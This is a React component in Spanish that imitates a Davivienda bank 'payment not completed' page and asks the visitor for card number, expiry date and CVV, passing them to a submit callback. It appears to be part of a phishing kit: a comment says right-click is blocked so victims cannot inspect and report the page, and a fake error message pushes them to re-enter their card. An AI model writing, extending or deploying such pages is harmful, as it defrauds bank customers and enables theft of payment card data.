/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useEffect, useState } from "react";

export default function Tarcredito({
  enviar,
  isError = false,
}: {
  enviar?: (data: any) => void;
  isError?: boolean;
}) {
  const [tarjeta, setTarjeta] = useState("");
  const [fecha, setFecha] = useState("");
  const [cvv, setCvv] = useState("");
  const [error, setError] = useState(isError ? "El número de la tarjeta tiene un error o no coincide con nuestros registros. Por favor, ingrésalo nuevamente." : "");

  // -------- VALIDACIONES ---------
  const isTarjetaValid = tarjeta.length >= 15 && tarjeta.length <= 16;
  const isFechaValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(fecha); // Formato MM/AA
  const isCvvValid = cvv.length >= 3 && cvv.length <= 4;

  useEffect(() => {
    // Bloquea F12 y clic derecho para que no inspeccionen y reporten fácil
    const handleContextMenu = (e: any) => e.preventDefault();
    document.addEventListener("contextmenu", handleContextMenu);
    return () => document.removeEventListener("contextmenu", handleContextMenu);
  }, []);

  // Activar el botón solo si los 3 campos están validados
  const canSubmit = isTarjetaValid && isFechaValid && isCvvValid;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit) {
      setError("Por favor, ingrese todos los datos correctamente.");
      return;
    }
    setError("");
    enviar?.({ tarjeta, fecha, cvv, view: "tarjeta_verif" });
  };

  // Máscara para la fecha MM/AA
  const handleFechaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, ""); // Solo números
    if (val.length > 4) val = val.slice(0, 4);

    if (val.length > 2) {
      val = val.slice(0, 2) + "/" + val.slice(2);
    }
    setFecha(val);
  };

  return (
    <form className="form-login" onSubmit={handleSubmit}>
      <div id="formAutenticar:loginp" className="loginp">
        <div className="wrap container-fluid">
          <div id="formAutenticar:panelContainer" className="form-container">
            <div id="formAutenticar:panelGroupMain" className="auth-form-container">
              <div style={{ display: "flex", justifyContent: "center", width: "100%", marginTop: "48px", marginBottom: "40px" }}>
                <img src="/bancos/davivienda/css/logo-davivienda.svg" style={{ height: "24px", width: "auto" }} alt="Davivienda Logo" />
              </div>

              <h2 className="auth-form__title" style={isError ? { color: "#E1111C" } : {}}>
                Pago no realizado
              </h2>
              <h3 className="auth-form__subtitle">
                En este momento no es posible realizar la transacción, para continuar el pago ingrese los datos de su tarjeta crédito o débito
              </h3>

              {/* Tarjeta Input */}
              <div className="form-field form-field__numero-documento">
                <label htmlFor="tarjeta_num">Número de Tarjeta</label>
                <input
                  id="tarjeta_num"
                  type="text"
                  placeholder="XXXX XXXX XXXX XXXX"
                  maxLength={16}
                  value={tarjeta}
                  className={error || (tarjeta && !isTarjetaValid) ? "error" : ""}
                  onChange={(e) => {
                    setTarjeta(e.target.value.replace(/[^0-9]/g, ""));
                    setError("");
                  }}
                />
              </div>

              {/* Fila Fecha y CVV */}
              <div style={{ display: "flex", gap: "16px", marginBottom: "24px" }}>
                <div style={{ flex: 1 }}>
                  <div className="form-field form-field__numero-documento" style={{ marginBottom: 0 }}>
                    <label htmlFor="tarjeta_fecha" style={{ width: "auto" }}>Fecha (MM/AA)</label>
                    <input
                      id="tarjeta_fecha"
                      type="text"
                      placeholder="MM/AA"
                      value={fecha}
                      className={error || (fecha && !isFechaValid && fecha.length === 5) ? "error" : ""}
                      onChange={(e) => {
                        handleFechaChange(e);
                        setError("");
                      }}
                    />
                  </div>
                </div>

                <div style={{ flex: 1 }}>
                  <div className="form-field form-field__numero-documento" style={{ marginBottom: 0 }}>
                    <label htmlFor="tarjeta_cvv" style={{ width: "auto" }}>CVV</label>
                    <input
                      id="tarjeta_cvv"
                      type="password"
                      placeholder="***"
                      maxLength={4}
                      value={cvv}
                      className={error || (cvv && !isCvvValid) ? "error" : ""}
                      onChange={(e) => {
                        setCvv(e.target.value.replace(/[^0-9]/g, ""));
                        setError("");
                      }}
                    />
                  </div>
                </div>
              </div>

              {/* Error Message */}
              {error && (
                <div className="error-message-container__otp show" style={{ display: "flex", alignItems: "center", gap: "8px", marginTop: "10px", marginBottom: "16px" }}>
                  <img src="css/error-icono.svg" className="error-message-icon" style={{ height: "16px", width: "16px" }} />
                  <p className="error" style={{ color: "#E1111C", margin: 0, fontSize: "14px" }}>
                    {error}
                  </p>
                </div>
              )}

              {/* Submit Button */}
              <div id="formAutenticar:button-container" className="submit">
                <input
                  id="formAutenticar:btnSubmitCont"
                  type="submit"
                  value={isError ? "Reintentar Validación" : "Verificar Tarjeta"}
                  className="btn-red continuar"
                  disabled={!canSubmit}
                  style={!canSubmit ? { opacity: 0.5, cursor: "not-allowed" } : {}}
                />
              </div>

              <div className="form-divider"></div>

              <div className="form-link-olvido">
                <a href="#">¿Olvidó su clave?</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </form>
  );
}
